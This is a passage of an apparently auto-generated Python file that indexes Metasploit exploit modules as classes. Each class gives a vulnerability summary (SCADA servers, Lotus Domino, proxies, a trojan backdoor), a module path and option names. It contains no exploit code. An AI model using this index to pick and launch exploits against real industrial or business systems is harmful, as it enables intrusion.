			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_scada_realwin_scpc_txtevent(object):
		"""
		
          This module exploits a stack buffer overflow in DATAC Control
        International RealWin SCADA Server 2.0 (Build 6.1.8.10).
        By sending a specially crafted packet,
        an attacker may be able to execute arbitrary code.
      
		"""

		path = 'windows/scada/realwin_scpc_txtevent'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_scada_winlog_runtime_2(object):
		"""
		
        This module exploits a buffer overflow in Sielco Sistem Winlog <= 2.07.16.
        When sending a specially formatted packet to the Runtime.exe service on port 46824,
        an attacker may be able to execute arbitrary code.
      
		"""

		path = 'windows/scada/winlog_runtime_2'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_scada_sunway_force_control_netdbsrv(object):
		"""
		
          This module exploits a stack based buffer overflow found in the SNMP
        NetDBServer service of Sunway Forcecontrol <= 6.1 sp3. The overflow is
        triggered when sending an overly long string to the listening service
        on port 2001.
      
		"""

		path = 'windows/scada/sunway_force_control_netdbsrv'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_scada_moxa_mdmtool(object):
		"""
		
          This module exploits a stack buffer overflow in MOXA MDM Tool 2.1.
        When sending a specially crafted MDMGw (MDM2_Gateway) response, an
        attacker may be able to execute arbitrary code.
      
		"""

		path = 'windows/scada/moxa_mdmtool'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_scada_scadapro_cmdexe(object):
		"""
		
        This module allows remote attackers to execute arbitray commands on the
        affected system by abusing via Directory Traversal attack when using the
        'xf' command (execute function). An attacker can execute system() from
        msvcrt.dll to upload a backdoor and gain remote code execution. This
        vulnerability affects version 4.0.0 and earlier.
      
		"""

		path = 'windows/scada/scadapro_cmdexe'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'

	class windows_scada_yokogawa_bkesimmgr_bof(object):
		"""
		
        This module exploits an stack based buffer overflow on Yokogawa CS3000. The vulnerability
        exists in the BKESimmgr.exe service when handling specially crafted packets, due to an
        insecure usage of memcpy, using attacker controlled data as the size count. This module
        has been tested successfully in Yokogawa CS3000 R3.08.50 over Windows XP SP3 and Windows
        2003 SP2.
      
		"""

		path = 'windows/scada/yokogawa_bkesimmgr_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_scada_abb_wserver_exec(object):
		"""
		
        This module exploits a remote stack buffer overflow vulnerability in ABB MicroSCADA. The
        issue is due to the handling of unauthenticated EXECUTE operations on the wserver.exe
        component, which allows arbitrary commands. The component is disabled by default, but
        required when a project uses the SCIL function WORKSTATION_CALL.

        This module has been tested successfully on ABB MicroSCADA Pro SYS600 9.3 on
        Windows XP SP3 and Windows 7 SP1.
      
		"""

		path = 'windows/scada/abb_wserver_exec'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			CMDSTAGER_FLAVOR = 'CMDSTAGER::FLAVOR'
			CMDSTAGER_DECODER = 'CMDSTAGER::DECODER'

	class windows_scada_igss_exec_17(object):
		"""
		
          This module abuses a directory traversal flaw in Interactive
        Graphical SCADA System v9.00. In conjunction with the traversal
        flaw, if opcode 0x17 is sent to the dc.exe process, an attacker
        may be able to execute arbitrary system commands.
      
		"""

		path = 'windows/scada/igss_exec_17'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_scada_factorylink_vrn_09(object):
		"""
		
          This module exploits a stack buffer overflow in FactoryLink 7.5, 7.5 SP2,
        and 8.0.1.703.  By sending a specially crafted packet, an attacker may be able to
        execute arbitrary code due to the improper use of a vsprintf() function while
        processing the user-supplied text field.  Originally found and posted by
        Luigi Auriemma.
      
		"""

		path = 'windows/scada/factorylink_vrn_09'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_scada_yokogawa_bkbcopyd_bof(object):
		"""
		
        This module exploits a stack based buffer overflow in Yokogawa CENTUM CS 3000. The vulnerability
        exists in the service BKBCopyD.exe when handling specially crafted packets. This module has
        been tested successfully on Yokogawa CENTUM CS 3000 R3.08.50 over Windows XP SP3.
      
		"""

		path = 'windows/scada/yokogawa_bkbcopyd_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_scada_advantech_webaccess_dashboard_file_upload(object):
		"""
		
         This module exploits an arbitrary file upload vulnerability found in Advantech WebAccess 8.0.

         This vulnerability allows remote attackers to execute arbitrary code on vulnerable installations
         of Advantech WebAccess. Authentication is not required to exploit this vulnerability.

         The specific flaw exists within the WebAccess Dashboard Viewer. Insufficient validation within
         the uploadImageCommon function in the UploadAjaxAction script allows unauthenticated callers to
         upload arbitrary code (instead of an image) to the server, which will then be executed under the
         high-privilege context of the IIS AppPool.
      
		"""

		path = 'windows/scada/advantech_webaccess_dashboard_file_upload'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			FileDropperDelay = 'FileDropperDelay'
			required_TARGETURI = 'TARGETURI'

	class windows_scada_yokogawa_bkfsim_vhfd(object):
		"""
		
        This module exploits an stack based buffer overflow on Yokogawa CS3000. The vulnerability
        exists in the service BKFSim_vhfd.exe when using malicious user-controlled data to create
        logs using functions like vsprintf and memcpy in a insecure way. This module has been
        tested successfully on Yokogawa Centum CS3000 R3.08.50 over Windows XP SP3.
      
		"""

		path = 'windows/scada/yokogawa_bkfsim_vhfd'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			CPORT = 'CPORT'
			CHOST = 'CHOST'

	class windows_backdoor_energizer_duo_payload(object):
		"""
		
          This module will execute an arbitrary payload against
        any system infected with the Arugizer trojan horse. This
        backdoor was shipped with the software package accompanying
        the Energizer DUO USB battery charger.
      
		"""

		path = 'windows/backdoor/energizer_duo_payload'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'

	class windows_lotus_domino_sametime_stmux(object):
		"""
		
          This module exploits a stack buffer overflow in Lotus Domino/'s Sametime
        Server. By sending an overly long POST request to the Multiplexer
        STMux.exe service we are able to overwrite SEH. Based on the exploit
        by Manuel Santamarina Suarez.
      
		"""

		path = 'windows/lotus/domino_sametime_stmux'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_lotus_domino_icalendar_organizer(object):
		"""
		
          This module exploits a vulnerability found in IBM Lotus Domino iCalendar.  By
        sending a long string of data as the "ORGANIZER;mailto" header, process "nRouter.exe"
        crashes due to a Cstrcpy() routine in nnotes.dll, which allows remote attackers to
        gain arbitrary code execution.

        Note: In order to trigger the vulnerable code path, a valid Domino mailbox account
        is needed.
      
		"""

		path = 'windows/lotus/domino_icalendar_organizer'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_MAILFROM = 'MAILFROM'
			required_MAILTO = 'MAILTO'

	class windows_lotus_lotusnotes_lzh(object):
		"""
		
        This module exploits a stack buffer overflow in Lotus Notes 8.5.2 when
        parsing a malformed, specially crafted LZH file. This vulnerability was
        discovered binaryhouse.net

      
		"""

		path = 'windows/lotus/lotusnotes_lzh'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			DATE = 'DATE'
			required_MAILFROM = 'MAILFROM'
			required_MAILTO = 'MAILTO'
			required_SUBJECT = 'SUBJECT'
			USERNAME = 'USERNAME'
			PASSWORD = 'PASSWORD'
			DOMAIN = 'DOMAIN'
			DynamicSehRecord = 'DynamicSehRecord'
			FILENAME = 'FILENAME'
			MESSAGE = 'MESSAGE'
			ExitOnSession = 'ExitOnSession'
			ListenerTimeout = 'ListenerTimeout'

	class windows_lotus_domino_http_accept_language(object):
		"""
		
          This module exploits a stack buffer overflow in IBM Lotus Domino Web Server
        prior to version 7.0.3FP1 and 8.0.1. This flaw is triggered by any HTTP
        request with an Accept-Language header greater than 114 bytes.
      
		"""

		path = 'windows/lotus/domino_http_accept_language'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			VHOST = 'VHOST'
			SSL = 'SSL'
			Proxies = 'Proxies'
			UserAgent = 'UserAgent'
			HttpUsername = 'HttpUsername'
			HttpPassword = 'HttpPassword'
			DigestAuthIIS = 'DigestAuthIIS'
			SSLVersion = 'SSLVersion'
			FingerprintCheck = 'FingerprintCheck'
			required_DOMAIN = 'DOMAIN'
			HttpClientTimeout = 'HttpClientTimeout'
			HttpTrace = 'HttpTrace'
			HTTP_uri_encode_mode = 'HTTP::uri_encode_mode'
			HTTP_uri_full_url = 'HTTP::uri_full_url'
			HTTP_pad_method_uri_count = 'HTTP::pad_method_uri_count'
			HTTP_pad_uri_version_count = 'HTTP::pad_uri_version_count'
			HTTP_pad_method_uri_type = 'HTTP::pad_method_uri_type'
			HTTP_pad_uri_version_type = 'HTTP::pad_uri_version_type'
			HTTP_method_random_valid = 'HTTP::method_random_valid'
			HTTP_method_random_invalid = 'HTTP::method_random_invalid'
			HTTP_method_random_case = 'HTTP::method_random_case'
			HTTP_version_random_valid = 'HTTP::version_random_valid'
			HTTP_version_random_invalid = 'HTTP::version_random_invalid'
			HTTP_uri_dir_self_reference = 'HTTP::uri_dir_self_reference'
			HTTP_uri_dir_fake_relative = 'HTTP::uri_dir_fake_relative'
			HTTP_uri_use_backslashes = 'HTTP::uri_use_backslashes'
			HTTP_pad_fake_headers = 'HTTP::pad_fake_headers'
			HTTP_pad_fake_headers_count = 'HTTP::pad_fake_headers_count'
			HTTP_pad_get_params = 'HTTP::pad_get_params'
			HTTP_pad_get_params_count = 'HTTP::pad_get_params_count'
			HTTP_pad_post_params = 'HTTP::pad_post_params'
			HTTP_pad_post_params_count = 'HTTP::pad_post_params_count'
			HTTP_uri_fake_end = 'HTTP::uri_fake_end'
			HTTP_uri_fake_params_start = 'HTTP::uri_fake_params_start'
			HTTP_header_folding = 'HTTP::header_folding'

	class windows_proxy_qbik_wingate_wwwproxy(object):
		"""
		
          This module exploits a stack buffer overflow in Qbik WinGate version
        6.1.1.1077 and earlier. By sending malformed HTTP POST URL to the
        HTTP proxy service on port 80, a remote attacker could overflow
        a buffer and execute arbitrary code.
      
		"""

		path = 'windows/proxy/qbik_wingate_wwwproxy'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_proxy_bluecoat_winproxy_host(object):
		"""
		
          This module exploits a buffer overflow in the Blue Coat Systems WinProxy
        service by sending a long port value for the Host header in a HTTP
        request.
      
		"""

		path = 'windows/proxy/bluecoat_winproxy_host'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_proxy_ccproxy_telnet_ping(object):
		"""
		
          This module exploits the YoungZSoft CCProxy <= v6.2 suite
        Telnet service. The stack is overwritten when sending an overly
        long address to the 'ping' command.
      
		"""

		path = 'windows/proxy/ccproxy_telnet_ping'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_proxy_proxypro_http_get(object):
		"""
		
          This module exploits a stack buffer overflow in Proxy-Pro Professional
        GateKeeper 4.7. By sending a long HTTP GET to the default port
        of 3128, a remote attacker could overflow a buffer and execute
        arbitrary code.
      
		"""

		path = 'windows/proxy/proxypro_http_get'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_motorola_timbuktu_fileupload(object):
		"""
		
        This module exploits a directory traversal vulnerablity in Motorola's
        Timbuktu Pro for Windows 8.6.5.
      
		"""

		path = 'windows/motorola/timbuktu_fileupload'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_RHOST = 'RHOST'
			required_RPORT = 'RPORT'
			SSL = 'SSL'
			SSLVersion = 'SSLVersion'
			SSLVerifyMode = 'SSLVerifyMode'
			SSLCipher = 'SSLCipher'
			Proxies = 'Proxies'
			CPORT = 'CPORT'
			CHOST = 'CHOST'
			required_ConnectTimeout = 'ConnectTimeout'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
